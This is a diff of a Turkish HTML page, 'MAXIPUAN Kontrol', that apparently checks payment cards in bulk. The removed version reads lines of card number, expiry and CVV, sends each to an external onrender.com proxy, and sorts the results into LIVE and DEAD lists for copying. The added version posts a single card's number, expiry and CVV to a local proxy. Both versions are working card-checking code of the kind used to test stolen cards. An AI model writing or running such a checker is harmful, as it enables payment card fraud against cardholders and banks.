@@ -1,92 +1,33 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <title>MAXIPUAN Kontrol</title>
-  <style>
-    body {
-      background-color: #111;
-      color: #eee;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    textarea {
-      width: 90%;
-      height: 150px;
-      margin-bottom: 10px;
-      background: #222;
-      color: #0f0;
-      border: 1px solid #555;
-      padding: 10px;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      margin: 5px;
-      cursor: pointer;
-      background-color: #444;
-      color: white;
-      border: none;
-      border-radius: 5px;
-    }
-    #live, #dead {
-      white-space: pre-wrap;
-      margin-top: 10px;
-      text-align: left;
-      width: 90%;
-      margin: auto;
-      background-color: #1a1a1a;
-      padding: 10px;
-      border: 1px solid #444;
-      border-radius: 5px;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <title>MaxiPuan Sorgu</title>
 </head>
 <body>
-  <h1>💳 MAXIPUAN KONTROL</h1>
-  <textarea id="cards" placeholder="Kartları buraya yaz: 4543xxxxxxxxxxxx|05|2027|000"></textarea><br>
-  <button onclick="start()">Kontrol Et</button>
-  <button onclick="copy('live')">✅ LIVE Kopyala</button>
-  <button onclick="copy('dead')">❌ DEAD Kopyala</button>
-
-  <h2>✅ LIVE</h2>
-  <div id="live"></div>
-
-  <h2>❌ DEAD</h2>
-  <div id="dead"></div>
+  <h2>Maxipuan Sorgula</h2>
+  <input type="text" id="cc" placeholder="Kart Numarası"><br>
+  <input type="text" id="month" placeholder="Ay (MM)"><br>
+  <input type="text" id="year" placeholder="Yıl (YYYY)"><br>
+  <input type="text" id="cvv" placeholder="CVV"><br>
+  <button onclick="sorgula()">Sorgula</button>
+  <pre id="sonuc"></pre>
 
   <script>
-    async function start() {
-      const cards = document.getElementById('cards').value.trim().split('\n');
-      document.getElementById('live').textContent = '';
-      document.getElementById('dead').textContent = '';
+    async function sorgula() {
+      const cc = document.getElementById("cc").value;
+      const month = document.getElementById("month").value;
+      const year = document.getElementById("year").value;
+      const cvv = document.getElementById("cvv").value;
 
-      for (let card of cards) {
-        if (!card) continue;
-
-        try {
-          const res = await fetch(`https://hzquarex-fa1j.onrender.com/proxy?card=${encodeURIComponent(card)}`);
-          const text = await res.text();
-
-          if (text.includes('✅')) {
-            document.getElementById('live').textContent += text + '\n';
-          } else {
-            document.getElementById('dead').textContent += text + '\n';
-          }
-        } catch (e) {
-          document.getElementById('dead').textContent += `❌ ${card} => HATA\n`;
-        }
-
-        await new Promise(r => setTimeout(r, 1000)); // istekler arasında 1 sn bekle
-      }
-    }
-
-    function copy(id) {
-      const content = document.getElementById(id).textContent;
-      navigator.clipboard.writeText(content).then(() => {
-        alert(`${id.toUpperCase()} kopyalandı`);
+      const response = await fetch("/proxy", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cc, month, year, cvv })
       });
+
+      const data = await response.json();
+      document.getElementById("sonuc").innerText = JSON.stringify(data, null, 2);
     }
   </script>
 </body>
